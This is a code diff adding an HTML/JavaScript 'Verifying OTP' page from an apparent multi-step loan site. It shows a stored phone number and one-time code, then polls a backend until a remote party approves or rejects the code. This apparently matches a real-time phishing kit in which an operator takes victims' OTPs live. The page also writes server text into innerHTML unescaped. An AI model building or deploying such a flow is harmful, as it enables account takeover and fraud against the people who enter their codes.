@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verifying OTP</title>
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      body {
+        background: #f3f4f6;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .card {
+        width: 90%;
+        max-width: 420px;
+        background: #fff;
+        border-radius: 20px;
+        padding: 40px 20px;
+        text-align: center;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      }
+
+      .loader {
+        position: relative;
+        width: 120px;
+        height: 120px;
+        margin: 0 auto 30px auto;
+        animation: rotate 1.5s linear infinite;
+      }
+
+      .dot {
+        position: absolute;
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+      }
+
+      .dot1 {
+        background: #f4c542;
+        top: 0;
+        left: 45px;
+      }
+      .dot2 {
+        background: #9b5de5;
+        right: 0;
+        top: 45px;
+      }
+      .dot3 {
+        background: #ef5350;
+        bottom: 0;
+        left: 45px;
+      }
+      .dot4 {
+        background: #2bbbad;
+        left: 0;
+        top: 45px;
+      }
+
+      @keyframes rotate {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      h1 {
+        color: #1ca48e;
+        font-size: 28px;
+        margin-bottom: 10px;
+      }
+
+      p {
+        color: #777;
+        font-size: 18px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="card">
+      <div class="loader">
+        <div class="dot dot1"></div>
+        <div class="dot dot2"></div>
+        <div class="dot dot3"></div>
+        <div class="dot dot4"></div>
+      </div>
+
+      <h1>Verifying OTP</h1>
+      <p id="verifyText">Please wait... (<span id="countdown">5</span>s)</p>
+    </div>
+
+    <script>
+      let pollInterval = null;
+
+      document.addEventListener("DOMContentLoaded", async () => {
+        const requestId = localStorage.getItem("requestId");
+        const phone =
+          (localStorage.getItem("countryCode") || "") +
+          (localStorage.getItem("phoneNumber") || "");
+        const otp = localStorage.getItem("otpCode") || "";
+        const verifyText = document.getElementById("verifyText");
+
+        if (!requestId) {
+          if (verifyText) verifyText.textContent = "Error: No request ID found";
+          return;
+        }
+
+        if (verifyText) {
+          verifyText.innerHTML = `Verifying OTP ${otp} for ${phone}... status: <span id="status" style="color: #ff9800;">Pending</span>`;
+        }
+
+        const backendUrl =
+          localStorage.getItem("backendUrl") || "https://your-backend.com";
+
+        // Poll backend for approval
+        pollInterval = setInterval(async () => {
+          try {
+            const response = await fetch(
+              `${backendUrl}/api/otp/status/${requestId}`,
+            );
+            const data = await response.json();
+
+            const statusEl = document.getElementById("status");
+            if (!statusEl) return;
+
+            if (data.approved) {
+              clearInterval(pollInterval);
+              statusEl.textContent = "✅ Approved!";
+              statusEl.style.color = "#4caf50";
+              if (verifyText)
+                verifyText.innerHTML = `OTP verified! Proceeding...`;
+
+              setTimeout(() => {
+                window.location.href = "loan7.html";
+              }, 1500);
+            } else if (data.rejected) {
+              clearInterval(pollInterval);
+              statusEl.textContent = "❌ Rejected";
+              statusEl.style.color = "#f44336";
+              if (verifyText)
+                verifyText.innerHTML = `OTP rejected: ${data.message}. <a href="loan5.html" style="color:#1abc9c;">Try again</a>`;
+            } else {
+              statusEl.textContent = "⏳ Waiting...";
+              statusEl.style.color = "#ff9800";
+            }
+          } catch (error) {
+            console.error("Poll error:", error);
+            const statusEl = document.getElementById("status");
+            if (statusEl) {
+              statusEl.textContent = "⚠️ Connection error";
+              statusEl.style.color = "#ff6b6b";
+            }
+          }
+        }, 2000);
+
+        // Timeout after 5 minutes
+        setTimeout(
+          () => {
+            clearInterval(pollInterval);
+            const statusEl = document.getElementById("status");
+            if (statusEl) {
+              statusEl.textContent = "Timeout";
+              statusEl.style.color = "#ff6b6b";
+            }
+            if (verifyText)
+              verifyText.innerHTML = `Request timed out. <a href="loan5.html" style="color:#1abc9c;">Try again</a>`;
+          },
+          5 * 60 * 1000,
+        );
+      });
+    </script>
+  </body>
+</html>
